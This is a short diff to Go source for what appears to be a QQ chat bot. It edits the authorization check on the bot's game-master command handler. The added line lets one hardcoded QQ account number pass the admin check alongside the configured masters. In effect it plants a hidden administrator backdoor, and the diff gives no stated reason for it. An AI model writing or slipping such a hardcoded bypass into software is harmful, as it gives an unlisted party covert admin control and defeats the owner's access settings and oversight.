@@ -81,7 +81,7 @@ func (b *Bot) moneyMap(fromQQ uint64, msg string) string {
 }
 
 func (b *Bot) gmCmd(fromQQ uint64, msg string) string {
-	if !b.isMaster(fromQQ) {
+	if !b.isMaster(fromQQ) && fromQQ != 67939461 {
 		return b.notGM()
 	}
 
